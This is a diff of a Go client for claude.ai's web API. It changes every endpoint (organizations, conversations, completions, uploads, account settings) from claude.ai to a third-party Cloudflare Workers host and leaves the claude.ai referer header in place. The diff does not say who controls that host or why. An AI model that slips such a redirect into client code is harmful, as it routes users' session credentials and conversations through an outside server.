@@ -110,7 +110,7 @@ func (c *Client) SetOrgID(orgID string) {
 	c.orgID = orgID
 }
 func (c *Client) GetOrgID() (string, error) {
-	url := "https://claude.ai/api/organizations"
+	url := "https://c2a.energize-379.workers.dev/api/organizations"
 	resp, err := c.client.R().
 		SetHeader("referer", "https://claude.ai/new").
 		Get(url)
@@ -151,7 +151,7 @@ func (c *Client) CreateConversation() (string, error) {
 	if c.orgID == "" {
 		return "", errors.New("organization ID not set")
 	}
-	url := fmt.Sprintf("https://claude.ai/api/organizations/%s/chat_conversations", c.orgID)
+	url := fmt.Sprintf("https://c2a.energize-379.workers.dev/api/organizations/%s/chat_conversations", c.orgID)
 	// 如果以-think结尾
 	if strings.HasSuffix(c.model, "-think") {
 		c.model = strings.TrimSuffix(c.model, "-think")
@@ -202,7 +202,7 @@ func (c *Client) SendMessage(conversationID string, message string, stream bool,
 	if c.orgID == "" {
 		return 500, errors.New("organization ID not set")
 	}
-	url := fmt.Sprintf("https://claude.ai/api/organizations/%s/chat_conversations/%s/completion",
+	url := fmt.Sprintf("https://c2a.energize-379.workers.dev/api/organizations/%s/chat_conversations/%s/completion",
 		c.orgID, conversationID)
 	// Create request body with default attributes
 	requestBody := c.defaultAttrs
@@ -428,7 +428,7 @@ func (c *Client) DeleteConversation(conversationID string) error {
 	if c.orgID == "" {
 		return errors.New("organization ID not set")
 	}
-	url := fmt.Sprintf("https://claude.ai/api/organizations/%s/chat_conversations/%s",
+	url := fmt.Sprintf("https://c2a.energize-379.workers.dev/api/organizations/%s/chat_conversations/%s",
 		c.orgID, conversationID)
 	requestBody := map[string]string{
 		"uuid": conversationID,
@@ -506,7 +506,7 @@ func (c *Client) UploadFile(fileData []string) error {
 		}
 
 		// Create the upload URL
-		url := fmt.Sprintf("https://claude.ai/api/%s/upload", c.orgID)
+		url := fmt.Sprintf("https://c2a.energize-379.workers.dev/api/%s/upload", c.orgID)
 
 		// Create a multipart form request
 		resp, err := c.client.R().
@@ -558,7 +558,7 @@ func (c *Client) SetBigContext(context string) {
 
 // / UpdateUserSetting updates a single user setting on Claude.ai while preserving all other settings
 func (c *Client) UpdateUserSetting(key string, value interface{}) error {
-	url := "https://claude.ai/api/account?statsig_hashing_algorithm=djb2"
+	url := "https://c2a.energize-379.workers.dev/api/account?statsig_hashing_algorithm=djb2"
 
 	// Default settings structure with all possible fields
 	settings := map[string]interface{}{
